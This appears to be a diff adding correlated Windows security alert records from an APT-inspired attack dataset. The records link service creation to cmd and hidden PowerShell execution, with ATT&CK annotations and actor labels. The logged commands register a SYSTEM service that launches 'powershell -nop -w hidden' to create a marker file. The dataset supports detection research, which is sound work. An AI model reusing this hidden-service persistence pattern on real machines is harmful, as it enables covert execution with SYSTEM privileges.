+              "name": "services.exe",
+              "pid": 608
+            },
+            "pid": 2344
+          },
+          "user": {
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1059.003"
+                ],
+                "names": [
+                  "Windows Command Shell"
+                ],
+                "tactics": [
+                  "Execution"
+                ]
+              }
+            },
+            "provenance": {
+              "csv_record_end_line": 37328,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "NCSUZZMBP3GtbmxP2Ifg",
+              "original_index": "wazuh-alerts-4.x-2024.11.25",
+              "processing_version": "1.0.0",
+              "row_sha256": "edf391a128cf684920bd81d083385fd741ebac8f11ac258e243bc230d9231429",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/23-30-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 2990,
+              "source_sha256": "1ff4ba90457024fe61e1416da8c755d53bd23a9937a3d75b80d44f7122d57373"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S07",
+              "name": "APT41"
+            }
+          }
+        },
+        {
+          "@timestamp": "2024-11-25T23:07:50.032974300Z",
+          "agent": {
+            "id": "3",
+            "name": "window-agent3"
+          },
+          "event": {
+            "code": "1",
+            "id": "e46b3e7a7b6f86a51ec757effeaf49ae2ce8438f9223cad86ed6a00f5d7e4aea",
+            "provider": "Microsoft-Windows-Sysmon"
+          },
+          "host": {
+            "name": "DESKTOP-QGB4EQH"
+          },
+          "process": {
+            "command_line": "powershell.exe  -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+            "entity_id": "{15959494-0346-6745-5C05-000000000500}",
+            "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "hash": {
+              "md5": "95000560239032bc68b4c2fdfcdef913",
+              "sha1": "1b3b40fbc889fd4c645cc12c85d0805ac36ba254",
+              "sha256": "d3f8fade829d2b7bd596c4504a6dae5c034e789b6a3defbe013bda7d14466677"
+            },
+            "name": "powershell.exe",
+            "parent": {
+              "command_line": "C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+              "entity_id": "{15959494-0346-6745-5B05-000000000500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "name": "cmd.exe",
+              "pid": 2344
+            },
+            "pid": 3120
+          },
+          "user": {
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1087",
+                  "T1059.003"
+                ],
+                "names": [
+                  "Account Discovery",
+                  "Windows Command Shell"
+                ],
+                "tactics": [
+                  "Discovery",
+                  "Execution"
+                ]
+              }
+            },
+            "provenance": {
+              "csv_record_end_line": 3297,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "NSSUZZMBP3GtbmxP2Ifg",
+              "original_index": "wazuh-alerts-4.x-2024.11.25",
+              "processing_version": "1.0.0",
+              "row_sha256": "e31a63df3f6f1ba97b35d374f3f68405b0475256895fcaee85103d475637ee71",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/23-30-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 327,
+              "source_sha256": "1ff4ba90457024fe61e1416da8c755d53bd23a9937a3d75b80d44f7122d57373"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S34",
+              "name": "Rocke"
+            }
+          }
+        }
+      ],
+      "explicit_utc": true,
+      "gaps_nanoseconds": [
+        15293400,
+        5255600
+      ],
+      "host": "DESKTOP-QGB4EQH",
+      "joins": [
+        "same host and full service imagePath equals shell command_line after Windows case/backslash comparison",
+        "same host and shell process.entity_id equals PowerShell process.parent.entity_id"
+      ],
+      "possible_benign_explanation": "Authorized service test or administrative automation; the command requests creation of an art-marker file. No malicious intent, file creation outcome or lasting persistence is proven by this chain.",
+      "span_nanoseconds": 20549000,
+      "techniques": [
+        "T1543.003",
+        "T1059.003",
+        "T1059.001"
+      ]
+    },
+    {
+      "event_ids": [
+        "0213192542e4d0897f86e0572722fb228d413a313b3347a86eb62d6316e3a21f",
+        "8f0564e44cea0da1038e46484c816a8668ee890529fcc83432f6c830a64d3e90",
+        "3faf8b4d35dd5fcb924ed44ed7e10d944f2b84243f9bf6f98c07b4e4b4d8d00d"
+      ],
+      "events": [
+        {
+          "@timestamp": "2024-11-09T19:19:38.500914800Z",
+          "agent": {
+            "id": "2",
+            "name": "wazuh-agent"
+          },
+          "event": {
+            "code": "7045",
+            "id": "0213192542e4d0897f86e0572722fb228d413a313b3347a86eb62d6316e3a21f",
+            "provider": "Service Control Manager"
+          },
+          "host": {
+            "name": "DESKTOP-FMI6MML"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1543.003"
+                ],
+                "names": [
+                  "Windows Service"
+                ],
+                "tactics": [
+                  "Persistence",
+                  "Privilege Escalation"
+                ]
+              }
+            },
+            "original": {
+              "_source.data.win.eventdata.accountName": "LocalSystem",
+              "_source.data.win.eventdata.imagePath": "C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+              "_source.data.win.eventdata.serviceName": "ARTService",
+              "_source.data.win.eventdata.serviceType": "user mode service",
+              "_source.data.win.eventdata.startType": "demand start"
+            },
+            "provenance": {
+              "csv_record_end_line": 35958,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "1PheEpMB--OMicoFPtOz",
+              "original_index": "wazuh-alerts-4.x-2024.11.09",
+              "processing_version": "1.0.0",
+              "row_sha256": "11e283a74d0de3ccf5b3d3a79c5b92b00116826b73af16ae213064232ecb69ab",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/1-11-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 2714,
+              "source_sha256": "e60f822890dab491a7a189c549c873a52d56f52c3dc31c125923917014a56900"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S34",
+              "name": "Rocke"
+            }
+          }
+        },
+        {
+          "@timestamp": "2024-11-09T19:19:38.522452Z",
+          "agent": {
+            "id": "2",
+            "name": "wazuh-agent"
+          },
+          "event": {
+            "code": "1",
+            "id": "8f0564e44cea0da1038e46484c816a8668ee890529fcc83432f6c830a64d3e90",
+            "provider": "Microsoft-Windows-Sysmon"
+          },
+          "host": {
+            "name": "DESKTOP-FMI6MML"
+          },
+          "process": {
+            "command_line": "C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+            "entity_id": "{D8AF36FB-B5CA-672F-3502-000000000700}",
+            "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "hash": {
+              "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+              "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+            },
+            "name": "cmd.exe",
+            "parent": {
+              "command_line": "C:\\\\Windows\\\\system32\\\\services.exe",
+              "entity_id": "{D8AF36FB-68F3-672F-0B00-000000000700}",
+              "executable": "C:\\\\Windows\\\\System32\\\\services.exe",
+              "name": "services.exe",
+              "pid": 648
+            },
+            "pid": 2036
+          },
+          "user": {
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1059.003"
+                ],
+                "names": [
+                  "Windows Command Shell"
+                ],
+                "tactics": [
+                  "Execution"
+                ]
+              }
+            },
+            "provenance": {
+              "csv_record_end_line": 115507,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "0PheEpMB--OMicoFPtOz",
+              "original_index": "wazuh-alerts-4.x-2024.11.09",
+              "processing_version": "1.0.0",
+              "row_sha256": "9094c62324957d9ad587e051c2cbc370cace7322e7fb5eb774dcfd3f35260978",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/1-11-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 8597,
+              "source_sha256": "e60f822890dab491a7a189c549c873a52d56f52c3dc31c125923917014a56900"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S16",
+              "name": "menuPass"
+            }
+          }
+        },
+        {
+          "@timestamp": "2024-11-09T19:19:38.535734500Z",
+          "agent": {
+            "id": "2",
+            "name": "wazuh-agent"
+          },
+          "event": {
+            "code": "1",
+            "id": "3faf8b4d35dd5fcb924ed44ed7e10d944f2b84243f9bf6f98c07b4e4b4d8d00d",
+            "provider": "Microsoft-Windows-Sysmon"
+          },
+          "host": {
+            "name": "DESKTOP-FMI6MML"
+          },
+          "process": {
+            "command_line": "powershell.exe  -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+            "entity_id": "{D8AF36FB-B5CA-672F-3602-000000000700}",
+            "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "hash": {
+              "md5": "95000560239032bc68b4c2fdfcdef913",
+              "sha256": "d3f8fade829d2b7bd596c4504a6dae5c034e789b6a3defbe013bda7d14466677"
+            },
+            "name": "powershell.exe",
+            "parent": {
+              "command_line": "C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+              "entity_id": "{D8AF36FB-B5CA-672F-3502-000000000700}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "name": "cmd.exe",
+              "pid": 2036
+            },
+            "pid": 2996
+          },
+          "user": {
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1087",
+                  "T1059.003"
+                ],
+                "names": [
+                  "Account Discovery",
+                  "Windows Command Shell"
+                ],
+                "tactics": [
+                  "Discovery",
+                  "Execution"
+                ]
+              }
+            },
+            "provenance": {
+              "csv_record_end_line": 115531,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "0fheEpMB--OMicoFPtOz",
+              "original_index": "wazuh-alerts-4.x-2024.11.09",
+              "processing_version": "1.0.0",
+              "row_sha256": "47ff5d389c3a4f5511756a4b7e5e1de925aed8f6a608e2192c3bdf58fb1da13a",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/1-11-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 8598,
+              "source_sha256": "e60f822890dab491a7a189c549c873a52d56f52c3dc31c125923917014a56900"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S34",
+              "name": "Rocke"
+            }
+          }
+        }
+      ],
+      "explicit_utc": true,
+      "gaps_nanoseconds": [
+        21537200,
+        13282500
+      ],
+      "host": "DESKTOP-FMI6MML",
+      "joins": [
+        "same host and full service imagePath equals shell command_line after Windows case/backslash comparison",
+        "same host and shell process.entity_id equals PowerShell process.parent.entity_id"
+      ],
+      "possible_benign_explanation": "Authorized service test or administrative automation; the command requests creation of an art-marker file. No malicious intent, file creation outcome or lasting persistence is proven by this chain.",
+      "span_nanoseconds": 34819700,
+      "techniques": [
+        "T1543.003",
+        "T1059.003",
+        "T1059.001"
+      ]
+    },
+    {
+      "event_ids": [
+        "be75d1504e5784527dfd60bc35420d21f910b57ffba3ffcc1d84ec30c23070f9",
+        "c5a93a534cf031f5789b321d070b3f6cf33ec3e79e50b72cf15e384b7821e8e4",
+        "c87894aacb7c79e770e4eb8b1fd95fcf9612bb5fddba0c3f00edea3a9a9d6634"
+      ],
+      "events": [
+        {
+          "@timestamp": "2024-11-06T09:58:51.208562600Z",
+          "agent": {
+            "id": "1",
+            "name": "DESKTOP-DS4FBF4"
+          },
+          "event": {
+            "code": "7045",
+            "id": "be75d1504e5784527dfd60bc35420d21f910b57ffba3ffcc1d84ec30c23070f9",
+            "provider": "Service Control Manager"
+          },
+          "host": {
+            "name": "DESKTOP-DS4FBF4"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1543.003"
+                ],
+                "names": [
+                  "Windows Service"
+                ],
+                "tactics": [
+                  "Persistence",
+                  "Privilege Escalation"
+                ]
+              }
+            },
+            "original": {
+              "_source.data.win.eventdata.accountName": "LocalSystem",
+              "_source.data.win.eventdata.imagePath": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+              "_source.data.win.eventdata.serviceName": "ARTService",
+              "_source.data.win.eventdata.serviceType": "user mode service",
+              "_source.data.win.eventdata.startType": "demand start"
+            },
+            "provenance": {
+              "csv_record_end_line": 48905,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "9tvpAJMBLF98WFwuwQMU",
+              "original_index": "wazuh-alerts-4.x-2024.11.06",
+              "processing_version": "1.0.0",
+              "row_sha256": "8a95eaa9e8e489cbb9862a86479e7512aedf164d5e1306e651c91c5365d9a973",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/1-11-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 3560,
+              "source_sha256": "e60f822890dab491a7a189c549c873a52d56f52c3dc31c125923917014a56900"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S07",
+              "name": "APT41"
+            }
+          }
+        },
+        {
+          "@timestamp": "2024-11-06T09:58:51.235401Z",
+          "agent": {
+            "id": "1",
+            "name": "DESKTOP-DS4FBF4"
+          },
+          "event": {
+            "code": "1",
+            "id": "c5a93a534cf031f5789b321d070b3f6cf33ec3e79e50b72cf15e384b7821e8e4",
+            "provider": "Microsoft-Windows-Sysmon"
+          },
+          "host": {
+            "name": "DESKTOP-DS4FBF4"
+          },
+          "process": {
+            "command_line": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+            "entity_id": "{8e11608b-3ddb-672b-1705-000000000500}",
+            "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "hash": {
+              "md5": "2b40c98ed0f7a1d3b091a3e8353132dc",
+              "sha1": "df79c86fdd11b9ccb89148458e509f879c72566c",
+              "sha256": "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
+            },
+            "name": "cmd.exe",
+            "parent": {
+              "command_line": "C:\\\\WINDOWS\\\\system32\\\\services.exe",
+              "entity_id": "{8e11608b-0c94-672b-0a00-000000000500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\services.exe",
+              "name": "services.exe",
+              "pid": 600
+            },
+            "pid": 2512
+          },
+          "user": {
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1059.003"
+                ],
+                "names": [
+                  "Windows Command Shell"
+                ],
+                "tactics": [
+                  "Execution"
+                ]
+              }
+            },
+            "provenance": {
+              "csv_record_end_line": 48898,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "9dvpAJMBLF98WFwuwQMU",
+              "original_index": "wazuh-alerts-4.x-2024.11.06",
+              "processing_version": "1.0.0",
+              "row_sha256": "4173c4bdeea2b2d7feb00f3f3b324d5d313eb9d2e27a3f36c0c902176a27a38f",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/1-11-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 3559,
+              "source_sha256": "e60f822890dab491a7a189c549c873a52d56f52c3dc31c125923917014a56900"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S07",
+              "name": "APT41"
+            }
+          }
+        },
+        {
+          "@timestamp": "2024-11-06T09:58:51.250364500Z",
+          "agent": {
+            "id": "1",
+            "name": "DESKTOP-DS4FBF4"
+          },
+          "event": {
+            "code": "1",
+            "id": "c87894aacb7c79e770e4eb8b1fd95fcf9612bb5fddba0c3f00edea3a9a9d6634",
+            "provider": "Microsoft-Windows-Sysmon"
+          },
+          "host": {
+            "name": "DESKTOP-DS4FBF4"
+          },
+          "process": {
+            "command_line": "powershell.exe  -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+            "entity_id": "{8e11608b-3ddb-672b-1805-000000000500}",
+            "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "hash": {
+              "md5": "2e5a8590cf6848968fc23de3fa1e25f1",
+              "sha1": "801262e122db6a2e758962896f260b55bbd0136a",
+              "sha256": "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
+            },
+            "name": "powershell.exe",
+            "parent": {
+              "command_line": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+              "entity_id": "{8e11608b-3ddb-672b-1705-000000000500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "name": "cmd.exe",
+              "pid": 2512
+            },
+            "pid": 11204
+          },
+          "user": {
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1087",
+                  "T1059.003"
+                ],
+                "names": [
+                  "Account Discovery",
+                  "Windows Command Shell"
+                ],
+                "tactics": [
+                  "Discovery",
+                  "Execution"
+                ]
+              }
+            },
+            "provenance": {
+              "csv_record_end_line": 94011,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "9NvpAJMBLF98WFwuwQMU",
+              "original_index": "wazuh-alerts-4.x-2024.11.06",
+              "processing_version": "1.0.0",
+              "row_sha256": "e76435fc1eec00450f0be3b0838de46d564546fa926f46a081929605147b490d",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/1-11-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 6798,
+              "source_sha256": "e60f822890dab491a7a189c549c873a52d56f52c3dc31c125923917014a56900"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S34",
+              "name": "Rocke"
+            }
+          }
+        }
+      ],
+      "explicit_utc": true,
+      "gaps_nanoseconds": [
+        26838400,
+        14963500
+      ],
+      "host": "DESKTOP-DS4FBF4",
+      "joins": [
+        "same host and full service imagePath equals shell command_line after Windows case/backslash comparison",
+        "same host and shell process.entity_id equals PowerShell process.parent.entity_id"
+      ],
+      "possible_benign_explanation": "Authorized service test or administrative automation; the command requests creation of an art-marker file. No malicious intent, file creation outcome or lasting persistence is proven by this chain.",
+      "span_nanoseconds": 41801900,
+      "techniques": [
+        "T1543.003",
+        "T1059.003",
+        "T1059.001"
+      ]
+    }
+  ],
+  "window_pair_counts": {
+    "300": {
+      "T1059.001->T1059.003": 120,
+      "T1059.003->T1059.001": 261,
+      "T1059.003->T1543.003": 268
+    },
+    "60": {
+      "T1059.001->T1059.003": 120,
+      "T1059.003->T1059.001": 261,
+      "T1059.003->T1543.003": 268
+    },
+    "900": {
+      "T1059.001->T1059.003": 120,
+      "T1059.003->T1059.001": 261,
+      "T1059.003->T1543.003": 268
+    }
+  }
+}
